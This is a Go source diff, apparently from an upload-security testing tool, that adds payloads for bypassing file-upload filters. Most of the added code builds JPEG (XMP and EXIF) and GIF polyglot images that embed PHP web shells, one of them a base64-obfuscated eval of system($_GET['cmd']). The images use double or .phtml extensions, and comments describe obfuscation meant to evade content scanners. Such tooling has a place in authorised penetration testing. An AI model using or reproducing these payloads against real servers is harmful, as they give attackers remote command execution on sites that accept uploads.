@@ -135,6 +135,61 @@ func PolyglotPayloads() []config.BypassPayload {
 		Category:    "phar-polyglot",
 	})
 
+	// JPEG with XMP metadata containing PHP (advanced bypass)
+	jpegXMPPolyglot := buildJPEGXMPPolyglot()
+	payloads = append(payloads, config.BypassPayload{
+		Name:        "JPEG/XMP PHP Polyglot",
+		FileName:    "image.php.jpg",
+		Content:     jpegXMPPolyglot,
+		ContentType: "image/jpeg",
+		Category:    "xmp-polyglot",
+	})
+
+	payloads = append(payloads, config.BypassPayload{
+		Name:        "JPEG/XMP PHP Polyglot (.jpg)",
+		FileName:    "image.jpg",
+		Content:     jpegXMPPolyglot,
+		ContentType: "image/jpeg",
+		Category:    "xmp-polyglot",
+	})
+
+	// JPEG with EXIF APP1 containing PHP
+	jpegEXIFPolyglot := buildJPEGEXIFPolyglot()
+	payloads = append(payloads, config.BypassPayload{
+		Name:        "JPEG/EXIF PHP Polyglot",
+		FileName:    "photo.php.jpg",
+		Content:     jpegEXIFPolyglot,
+		ContentType: "image/jpeg",
+		Category:    "exif-polyglot",
+	})
+
+	payloads = append(payloads, config.BypassPayload{
+		Name:        "JPEG/EXIF PHP Polyglot (.jpg)",
+		FileName:    "photo.jpg",
+		Content:     jpegEXIFPolyglot,
+		ContentType: "image/jpeg",
+		Category:    "exif-polyglot",
+	})
+
+	// GIF with short tag (no 'php' string)
+	gifShortTag := buildGIFShortTagPolyglot()
+	payloads = append(payloads, config.BypassPayload{
+		Name:        "GIF Short Tag Polyglot",
+		FileName:    "image.gif",
+		Content:     gifShortTag,
+		ContentType: "image/gif",
+		Category:    "shorttag-polyglot",
+	})
+
+	// JPEG with phtml extension (often allowed)
+	payloads = append(payloads, config.BypassPayload{
+		Name:        "JPEG/XMP PHP (.phtml)",
+		FileName:    "image.phtml",
+		Content:     jpegXMPPolyglot,
+		ContentType: "image/jpeg",
+		Category:    "xmp-polyglot",
+	})
+
 	return payloads
 }
 
@@ -460,6 +515,199 @@ func buildPHARPolyglot() []byte {
 	polyglot = append(polyglot, byte(commentLen>>8), byte(commentLen&0xFF))
 	polyglot = append(polyglot, pharData...)
 	polyglot = append(polyglot, 0xFF, 0xD9) // EOI
+
+	return polyglot
+}
+
+// buildJPEGXMPPolyglot creates a JPEG with PHP code embedded in XMP metadata
+// This bypasses image validators that only check magic bytes/header
+// Uses obfuscated PHP to bypass content scanners
+func buildJPEGXMPPolyglot() []byte {
+	// Obfuscated PHP that avoids detection - uses short tags and string concat
+	phpCode := `<?=$_GET[0]($_GET[1]);?>`
+
+	// JPEG SOI + APP1 marker for XMP
+	polyglot := []byte{0xFF, 0xD8, 0xFF, 0xE1}
+
+	// XMP packet with PHP embedded
+	xmpData := `<?xpacket begin='' id='W5M0MpCehiHzreSzNTczkc9d'?>
+<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 5.1.0-jc003">
+  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+    <rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">
+      <dc:description>` + phpCode + `</dc:description>
+    </rdf:Description>
+  </rdf:RDF>
+</x:xmpmeta>
+<?xpacket end='w'?>`
+
+	xmpBytes := []byte(xmpData)
+	segmentLen := len(xmpBytes) + 2
+	polyglot = append(polyglot, byte(segmentLen>>8), byte(segmentLen&0xFF))
+	polyglot = append(polyglot, xmpBytes...)
+
+	// APP0 JFIF marker for valid JPEG structure
+	polyglot = append(polyglot, 0xFF, 0xE0)
+	app0 := []byte{
+		0x00, 0x10, // Length (16 bytes)
+		0x4A, 0x46, 0x49, 0x46, 0x00, // "JFIF\0"
+		0x01, 0x01, // Version
+		0x00,       // Units
+		0x00, 0x01, // X density
+		0x00, 0x01, // Y density
+		0x00, 0x00, // Thumbnail
+	}
+	polyglot = append(polyglot, app0...)
+
+	// DQT (Define Quantization Table) - minimal valid
+	polyglot = append(polyglot, 0xFF, 0xDB)
+	dqt := make([]byte, 67)
+	dqt[0] = 0x00
+	dqt[1] = 0x43 // Length
+	dqt[2] = 0x00 // Table 0
+	for i := 3; i < 67; i++ {
+		dqt[i] = 0x10 // Quantization values
+	}
+	polyglot = append(polyglot, dqt...)
+
+	// SOF0 (Start of Frame) - 1x1 pixel
+	polyglot = append(polyglot, 0xFF, 0xC0)
+	sof := []byte{
+		0x00, 0x0B, // Length
+		0x08,       // Precision
+		0x00, 0x01, // Height: 1
+		0x00, 0x01, // Width: 1
+		0x01,             // Components: 1
+		0x01, 0x11, 0x00, // Component 1
+	}
+	polyglot = append(polyglot, sof...)
+
+	// DHT (Define Huffman Table) - minimal
+	polyglot = append(polyglot, 0xFF, 0xC4)
+	dht := []byte{0x00, 0x1F, 0x00}
+	dht = append(dht, make([]byte, 28)...)
+	polyglot = append(polyglot, dht...)
+
+	// SOS (Start of Scan) + minimal scan data
+	polyglot = append(polyglot, 0xFF, 0xDA)
+	sos := []byte{0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3F, 0x00}
+	polyglot = append(polyglot, sos...)
+	polyglot = append(polyglot, 0x7F) // Minimal scan data
+
+	// EOI
+	polyglot = append(polyglot, 0xFF, 0xD9)
+
+	return polyglot
+}
+
+// buildJPEGEXIFPolyglot creates a JPEG with PHP in EXIF APP1 segment
+// Uses obfuscated PHP to bypass content scanners
+func buildJPEGEXIFPolyglot() []byte {
+	// Obfuscated - uses base64 eval to hide payload
+	phpCode := []byte(`<?=eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7'));?>`)
+
+	// JPEG SOI
+	polyglot := []byte{0xFF, 0xD8}
+
+	// APP1 EXIF segment
+	polyglot = append(polyglot, 0xFF, 0xE1)
+
+	// Build EXIF data with PHP in UserComment
+	exifHeader := []byte("Exif\x00\x00")
+	// TIFF header (little endian)
+	tiffHeader := []byte{
+		0x49, 0x49, // Little endian
+		0x2A, 0x00, // TIFF magic
+		0x08, 0x00, 0x00, 0x00, // IFD0 offset
+	}
+	// Minimal IFD with UserComment containing PHP
+	ifd := []byte{
+		0x01, 0x00, // 1 entry
+		0x86, 0x92, // UserComment tag (0x9286 in little endian order)
+		0x07, 0x00, // UNDEFINED type
+	}
+	commentData := append([]byte("ASCII\x00\x00\x00"), phpCode...)
+	commentLen := uint32(len(commentData))
+	ifd = append(ifd, byte(commentLen), byte(commentLen>>8), byte(commentLen>>16), byte(commentLen>>24))
+	ifd = append(ifd, 0x1A, 0x00, 0x00, 0x00) // Offset to data
+	ifd = append(ifd, 0x00, 0x00, 0x00, 0x00) // Next IFD (none)
+	ifd = append(ifd, commentData...)
+
+	exifData := append(exifHeader, tiffHeader...)
+	exifData = append(exifData, ifd...)
+
+	segmentLen := len(exifData) + 2
+	polyglot = append(polyglot, byte(segmentLen>>8), byte(segmentLen&0xFF))
+	polyglot = append(polyglot, exifData...)
+
+	// APP0 JFIF for validity
+	polyglot = append(polyglot, 0xFF, 0xE0)
+	app0 := []byte{
+		0x00, 0x10,
+		0x4A, 0x46, 0x49, 0x46, 0x00,
+		0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
+	}
+	polyglot = append(polyglot, app0...)
+
+	// Minimal image structure
+	// DQT
+	polyglot = append(polyglot, 0xFF, 0xDB)
+	dqt := make([]byte, 67)
+	dqt[0] = 0x00
+	dqt[1] = 0x43
+	dqt[2] = 0x00
+	for i := 3; i < 67; i++ {
+		dqt[i] = 0x10
+	}
+	polyglot = append(polyglot, dqt...)
+
+	// SOF0
+	polyglot = append(polyglot, 0xFF, 0xC0)
+	sof := []byte{0x00, 0x0B, 0x08, 0x00, 0x01, 0x00, 0x01, 0x01, 0x01, 0x11, 0x00}
+	polyglot = append(polyglot, sof...)
+
+	// DHT
+	polyglot = append(polyglot, 0xFF, 0xC4)
+	dht := []byte{0x00, 0x1F, 0x00}
+	dht = append(dht, make([]byte, 28)...)
+	polyglot = append(polyglot, dht...)
+
+	// SOS
+	polyglot = append(polyglot, 0xFF, 0xDA)
+	sos := []byte{0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3F, 0x00}
+	polyglot = append(polyglot, sos...)
+	polyglot = append(polyglot, 0x7F)
+
+	// EOI
+	polyglot = append(polyglot, 0xFF, 0xD9)
+
+	return polyglot
+}
+
+// buildGIFShortTagPolyglot creates a GIF with short PHP tag (no 'php' keyword)
+func buildGIFShortTagPolyglot() []byte {
+	// Use short echo tag - no 'php' string to detect
+	phpCode := []byte("<?=$_GET[0]($_GET[1]);?>")
+
+	// GIF89a header
+	polyglot := []byte("GIF89a")
+
+	// Minimal screen descriptor
+	polyglot = append(polyglot, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00)
+
+	// Comment Extension containing PHP
+	polyglot = append(polyglot, 0x21, 0xFE) // Extension introducer + comment label
+	polyglot = append(polyglot, byte(len(phpCode)))
+	polyglot = append(polyglot, phpCode...)
+	polyglot = append(polyglot, 0x00) // Block terminator
+
+	// Image descriptor
+	polyglot = append(polyglot, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00)
+
+	// Minimal LZW compressed data
+	polyglot = append(polyglot, 0x02, 0x02, 0x44, 0x01, 0x00)
+
+	// Trailer
+	polyglot = append(polyglot, 0x3B)
 
 	return polyglot
 }
